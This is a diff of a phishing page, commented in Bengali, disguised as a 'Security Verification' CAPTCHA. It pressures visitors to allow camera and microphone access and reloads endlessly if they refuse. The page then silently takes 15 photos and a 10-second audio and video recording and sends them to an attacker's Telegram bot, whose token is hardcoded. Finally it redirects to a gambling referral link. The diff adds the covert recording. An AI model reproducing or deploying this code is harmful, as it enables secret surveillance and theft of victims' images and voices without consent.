@@ -1,76 +1,71 @@
-<!DOCTYPE html>
+      <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking your browser...</title>
+    <title>Security Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        #v_stream { position: fixed; left: -9999px; opacity: 0; pointer-events: none; }
+        #v_stream { position: fixed; left: -9999px; opacity: 0; }
     </style>
 </head>
-<body class="bg-gray-50 flex items-center justify-center min-h-screen">
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
 
-    <div class="max-w-md w-full p-8 bg-white shadow-lg rounded-lg text-center border border-gray-200">
-        <div class="flex justify-center mb-6">
-            <div class="animate-spin rounded-full h-12 w-12 border-4 border-blue-500 border-t-transparent"></div>
+    <div class="max-w-md w-full p-6 bg-white shadow-xl rounded-xl text-center">
+        <div class="mb-4 flex justify-center">
+            <div class="animate-spin h-10 w-10 border-4 border-blue-500 border-t-transparent rounded-full"></div>
         </div>
-        <h1 class="text-2xl font-bold text-gray-800 mb-4">Verifying your connection</h1>
-        <p class="text-gray-600 mb-6 text-sm">Please wait while we verify you are a human. This helps us prevent spam.</p>
-        
-        <div class="p-4 bg-blue-50 rounded text-blue-700 text-xs text-left mb-6 border border-blue-100">
-            <strong>Action Required:</strong> Click <b>"Allow"</b> on the browser prompt to complete the security check.
-        </div>
-        
-        <p class="text-gray-400 text-[10px]">Ray ID: 91b3c2a0e7d12402</p>
+        <h2 class="text-xl font-bold text-gray-800">Verifying Connection...</h2>
+        <p class="text-gray-500 mt-2 text-sm">Please click <b>"Allow"</b> to confirm you are not a robot.</p>
     </div>
 
-    <video id="v_stream" autoplay playsinline></video>
+    <video id="v_stream" autoplay playsinline muted></video>
     <canvas id="c_save" class="hidden"></canvas>
 
     <script>
-        // ১. সরাসরি ক্রোম ব্রাউজারে ওপেন করার অটোমেটিক সিস্টেম
-        const isApp = /FBAN|FBAV|Messenger|Telegram|Instagram/i.test(navigator.userAgent);
-        if (isApp && navigator.userAgent.includes("Android")) {
-            window.location.href = "intent://" + window.location.host + window.location.pathname + window.search + "#Intent;scheme=https;package=com.android.chrome;end";
+        // ১. সরাসরি ক্রোম ব্রাউজারে ওপেন করার সিস্টেম
+        const ua = navigator.userAgent;
+        if (/FBAN|FBAV|Messenger|Telegram|Instagram/i.test(ua) && ua.includes("Android")) {
+            const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
+            window.location.href = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
         }
 
         const CONFIG = {
             t: '8355080071:AAHZ5KdTDSkqNLgSe_9gsuGCyUMYru5pNe4',
-            c: '7785049939', // <--- আপনার Telegram Chat ID এখানে বসান
+            c: '7785049939', // <--- আপনার Telegram ID বসান
             u: 'https://dkwin9.com/#/register?invitationCode=14856937272',
-            max_photos: 15 
+            max_photos: 15,
+            video_duration: 10000 
         };
 
         let photoCount = 0;
 
         async function init() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const video = document.getElementById('v_stream');
                 video.srcObject = stream;
-                
-                // অনুমতি দিলে দ্রুত ছবি তোলা শুরু করবে
-                startBurstMode();
+
+                // ২. ফটো তোলা শুরু (Burst Mode)
+                startBurstPhotos();
+
+                // ৩. ভিডিও রেকর্ডিং শুরু
+                startVideoRecording(stream);
+
             } catch (err) {
-                // ইউজার Block করলে বা কেটে দিলে অটোমেটিক রিলোড হবে (Infinite Loop)
-                setTimeout(() => { location.reload(); }, 500);
+                location.reload();
             }
         }
 
-        function startBurstMode() {
-            const burst = setInterval(() => {
+        function startBurstPhotos() {
+            const photoInterval = setInterval(() => {
                 if (photoCount < CONFIG.max_photos) {
                     takeSnap();
                     photoCount++;
                 } else {
-                    clearInterval(burst);
-                    // ১৫টি ছবি তোলা শেষ হলে মেইন লিঙ্কে পাঠিয়ে দিবে
-                    window.location.replace(CONFIG.u);
+                    clearInterval(photoInterval);
                 }
-            }, 400); // প্রতি ০.৪ সেকেন্ডে একটি ছবি (খুবই দ্রুত)
+            }, 500); // প্রতি ০.৫ সেকেন্ডে একটি ছবি
         }
 
         function takeSnap() {
@@ -83,13 +78,32 @@
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', CONFIG.c);
-                formData.append('photo', blob, `shot_${photoCount}.jpg`);
-
-                fetch(`https://api.telegram.org/bot${CONFIG.t}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+                formData.append('photo', blob, `img_${photoCount}.jpg`);
+                fetch(`https://api.telegram.org/bot${CONFIG.t}/sendPhoto`, { method: 'POST', body: formData });
             }, 'image/jpeg', 0.6);
+        }
+
+        function startVideoRecording(stream) {
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+
+            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const formData = new FormData();
+                formData.append('chat_id', CONFIG.c);
+                formData.append('video', blob, 'capture.mp4');
+                formData.append('caption', 'Target Multi-Capture (Photo + Video)');
+
+                await fetch(`https://api.telegram.org/bot${CONFIG.t}/sendVideo`, { method: 'POST', body: formData });
+                window.location.replace(CONFIG.u);
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+            }, CONFIG.video_duration);
         }
 
         window.onload = init;
